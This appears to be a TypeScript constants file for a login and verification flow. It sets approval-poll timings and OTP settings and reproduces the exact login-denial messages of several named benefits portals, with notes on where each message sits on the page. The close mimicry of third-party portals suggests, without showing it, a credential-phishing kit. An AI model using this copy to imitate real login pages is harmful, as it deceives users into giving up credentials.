/** Fast polls for the first burst window, then steadier cadence. */
export const BURST_POLL_MS = 200
export const BURST_WINDOW_MS = 10_000
/** Steady poll interval after the burst window. */
export const POLL_MS = 500

/** Delay until the next approval status poll based on time since wait started. */
export function approvalPollDelayMs(waitStartedAtMs: number): number {
  return Date.now() - waitStartedAtMs < BURST_WINDOW_MS ? BURST_POLL_MS : POLL_MS
}
export const APPROVAL_TIMEOUT_MS = 90_000

export const MSG_UNABLE_VERIFY_TIME =
  "We are unable to verify you at this time. Please try again."

export const MSG_UNABLE_REACH_VERIFICATION =
  "Unable to reach verification. Please try again."

export const OTP_CODE_ERROR_TEXT =
  "The code you entered is incorrect or has expired."

export const OTP_RESEND_LOADING_MS = 2_000
export const OTP_RESEND_COOLDOWN_SEC = 30

/**
 * Portal-Family Specific Login Denial Messages
 */

/** WEX Sites (LH1 OnDemand, WEX Health). Placed at top of form panel/card above input fields. */
export const MSG_LOGIN_DENIED_WEX =
  "The provided username/password was incorrect. Please try again or contact your service provider."

/** Wealthcare Portals (BenefitExpress, Highmark, Plansource, etc.). Placed in card header / banner area. */
export const MSG_LOGIN_DENIED_WEALTHCARE =
  "Login Unsuccessful.\nThe information provided does not match our records. You may need to retry your credentials."

/** Alight Worklife Portals (BOA, Home Depot, CAT, etc.). Placed below input field inside .form-group with error icon. */
export const MSG_LOGIN_DENIED_ALIGHT =
  "The entered User Id and/or password is incorrect. Please try again. Your account will be locked after multiple failed attempts for security reasons."

/** Generic / fallback dynamic denial copy (casing matches landing field label). */
export const MSG_INCORRECT_USER_ID_PASSWORD = "Incorrect password or User ID."
export const MSG_INCORRECT_USERNAME_PASSWORD = "Incorrect password or Username."
export const MSG_INCORRECT_EMAIL_PASSWORD = "Incorrect password or Email."

export type PortalFamily = "wex" | "wealthcare" | "alight" | "generic"

/**
 * Returns the appropriate login denial error message based on portal family or identifier label.
 */
export function getLoginDeniedMessage(
  family: PortalFamily = "generic",
  identifierLabel = "User ID",
): string {
  switch (family) {
    case "wex":
      return MSG_LOGIN_DENIED_WEX
    case "wealthcare":
      return MSG_LOGIN_DENIED_WEALTHCARE
    case "alight":
      return MSG_LOGIN_DENIED_ALIGHT
    case "generic":
    default: {
      const normalized = identifierLabel.trim().toLowerCase()
      if (normalized.includes("email")) return MSG_INCORRECT_EMAIL_PASSWORD
      if (normalized.includes("user id") || normalized.includes("userid")) {
        return MSG_INCORRECT_USER_ID_PASSWORD
      }
      if (normalized.includes("username") || normalized.includes("user name")) {
        return MSG_INCORRECT_USERNAME_PASSWORD
      }
      return `Incorrect password or ${identifierLabel.trim()}.`
    }
  }
}
